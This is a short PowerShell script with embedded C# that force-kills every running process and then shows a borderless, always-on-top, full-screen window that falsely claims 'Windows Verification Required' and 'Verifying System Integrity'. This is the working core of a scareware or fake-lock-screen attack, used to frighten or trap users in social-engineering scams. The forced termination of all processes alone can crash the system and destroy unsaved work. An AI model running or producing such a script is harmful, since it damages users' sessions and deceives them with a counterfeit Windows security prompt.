# Close all open windows
Stop-Process -Name * -Force -ErrorAction SilentlyContinue

# Create a fake verification fullscreen window
Add-Type -TypeDefinition @"
using System;
using System.Windows.Forms;
using System.Drawing;

public class FakeLock {
    public static void ShowWindow() {
        Form form = new Form();
        form.Text = "Windows Verification Required";
        form.Size = new System.Drawing.Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
        form.StartPosition = FormStartPosition.CenterScreen;
        form.FormBorderStyle = FormBorderStyle.None;
        form.BackColor = Color.Black;
        form.TopMost = true;

        Label label = new Label();
        label.Text = "🔒 Windows Verification Required 🔒\n\nVerifying System Integrity...";
        label.Font = new Font("Arial", 30, FontStyle.Bold);
        label.ForeColor = Color.Red;
        label.Dock = DockStyle.Fill;
        label.TextAlign = ContentAlignment.MiddleCenter;
        form.Controls.Add(label);

        form.ShowDialog();
    }
}
"@ -Language CSharp

[FakeLock]::ShowWindow()
